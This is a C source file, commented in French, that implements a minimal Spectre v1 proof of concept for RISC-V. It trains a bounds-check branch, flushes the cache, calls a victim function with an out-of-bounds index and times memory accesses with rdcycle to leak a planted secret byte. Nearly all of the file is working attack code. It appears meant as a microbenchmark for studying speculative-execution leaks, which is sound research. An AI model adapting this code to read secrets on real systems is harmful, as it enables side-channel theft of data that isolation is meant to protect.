#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define ARRAY1_SIZE      256
#define ARRAY1_LOGICAL   16      // array1_size logique vue par victim
#define FLUSH_BUF_SIZE   (1024 * 1024) // 1 MiB
#define TRAIN_ITERS      10000   // nombre de trainings avant l'attaque

// Globals
volatile uint8_t array1[ARRAY1_SIZE];
volatile uint8_t array2[256 * 512];
uint8_t flush_buf[FLUSH_BUF_SIZE];

uint8_t temp = 0;

static inline uint64_t read_cycle(void) {
    uint64_t cycle;
    asm volatile ("rdcycle %0" : "=r"(cycle));
    return cycle;
}

__attribute__((noinline))
uint64_t measure_access_time(int k) {
    volatile uint8_t *addr = &array2[k * 512];

    asm volatile("fence rw,rw" ::: "memory");
    uint64_t start = read_cycle();
    temp &= *addr;
    asm volatile("fence rw,rw" ::: "memory");
    uint64_t end = read_cycle();

    return end - start;
}

// Gadget Spectre v1
__attribute__((noinline))
void victim_function(size_t x) {
    if (x < ARRAY1_LOGICAL) {
        uint8_t value = array1[x];
        size_t idx    = ((size_t)value) * 512;
        temp &= array2[idx];
    }
}

int main(int argc, char **argv) {
    // 1) init array1
    for (int i = 0; i < ARRAY1_SIZE; i++)
        array1[i] = (uint8_t)(i + 1);   // valeurs non nulles

    // secret d’un seul byte à l’index 16
    array1[16] = 'D';   // secret = 'D'

    // 2) init array2 et flush_buf
    for (int i = 0; i < (int)sizeof(array2); i++)
        array2[i] = 1;

    for (size_t j = 0; j < FLUSH_BUF_SIZE; j++)
        flush_buf[j] = (uint8_t)j;

    printf("Starting minimal Spectre v1 microbench...\n");
    printf("array1[16] (secret) = '%c' (0x%02x)\n", array1[16], array1[16]);

    // 3) GROS TRAINING : x toujours valide (0..15), branche toujours prise
    for (int t = 0; t < TRAIN_ITERS; t++) {
        size_t x = t % ARRAY1_LOGICAL;  // 0..15
        victim_function(x);
    }

    // 4) FLUSH CACHE (array2) via flush_buf
    for (size_t j = 0; j < FLUSH_BUF_SIZE; j += 64) {
        flush_buf[j]++; // gros trafic mémoire
    }

    // 5) ATTACK : x = 16 >= ARRAY1_LOGICAL
    //    Architecturiellement : if (x < 16) == false, donc pas d'accès.
    //    Spéculativement (si misprediction) : if pris, accès à array1[16] = 'D'.
    size_t malicious_x = 16;
    victim_function(malicious_x);

    // 6) MESURE : timings d’accès aux 256 lignes potentielles
    uint64_t best_time = (uint64_t)-1;
    int best_k = -1;

    printf("Measuring access times...\n");
    for (int k = 0; k < 256; k++) {
        uint64_t dt = measure_access_time(k);
        printf("k = %3d, dt = %5lu\n", k, dt);
        if (dt < best_time) {
            best_time = dt;
            best_k = k;
        }
    }

    printf("Best index: k = %d (0x%02x), time = %lu\n",
           best_k, best_k & 0xff, best_time);
    printf("Secret byte was: 'D' (0x44)\n");
    printf("temp = %u\n", temp);

    return 0;
}
